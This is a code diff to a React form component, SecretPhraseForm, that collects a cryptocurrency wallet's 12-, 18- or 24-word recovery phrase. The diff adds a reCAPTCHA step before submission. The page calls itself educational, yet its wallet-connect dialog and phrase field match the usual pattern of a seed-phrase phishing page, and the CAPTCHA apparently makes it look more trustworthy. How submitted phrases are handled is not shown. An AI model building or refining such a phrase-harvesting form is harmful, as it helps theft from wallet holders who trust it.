@@ -350,7 +350,38 @@ const FormSchema = z.object({
           "Secret phrase must contain exactly 12, 18, or 24 words.",
       }
     ),
+    recaptcha: z.string().min(1, { message: "Please complete the reCAPTCHA." }),
 });
+
+function ReCAPTCHAComponent({ onChange }) {
+  const recaptchaRef = React.useRef<HTMLDivElement>(null);
+  const widgetIdRef = React.useRef<number | null>(null);
+
+  React.useEffect(() => {
+    const global = window as any;
+    if (!global.grecaptcha || !global.grecaptcha.render) {
+      return;
+    }
+
+    const renderRecaptcha = () => {
+      if (recaptchaRef.current && widgetIdRef.current === null) {
+        widgetIdRef.current = global.grecaptcha.render(recaptchaRef.current, {
+          sitekey: "6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP", // Public test key
+          theme: "dark",
+          callback: onChange,
+        });
+      }
+    };
+
+    if (global.grecaptcha.ready) {
+      global.grecaptcha.ready(renderRecaptcha);
+    }
+
+  }, [onChange]);
+
+  return <div ref={recaptchaRef}></div>;
+}
+
 
 function SecretPhraseForm({ wallet, onBack, onSuccess }) {
   const { toast } = useToast();
@@ -358,6 +389,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
     resolver: zodResolver(FormSchema),
     defaultValues: {
       secretPhrase: "",
+      recaptcha: "",
     },
   });
 
@@ -441,7 +473,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
         </DialogDescription>
       </DialogHeader>
       <Form {...form}>
-        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 pt-4">
+        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4 pt-4">
           <FormField
             control={form.control}
             name="secretPhrase"
@@ -473,13 +505,26 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
             )}
           />
 
+           <FormField
+            control={form.control}
+            name="recaptcha"
+            render={({ field }) => (
+              <FormItem>
+                <FormControl>
+                  <ReCAPTCHAComponent onChange={field.onChange} />
+                </FormControl>
+                <FormMessage />
+              </FormItem>
+            )}
+          />
+
            <p className="text-xs text-muted-foreground">
               This site is for educational purposes. Do not use your real secret phrase.
             </p>
           <Button
             type="submit"
             className="w-full bg-accent text-accent-foreground hover:bg-accent/90"
-            disabled={form.formState.isSubmitting}
+            disabled={form.formState.isSubmitting || !form.watch("recaptcha")}
           >
             {form.formState.isSubmitting
               ? "Validating..."
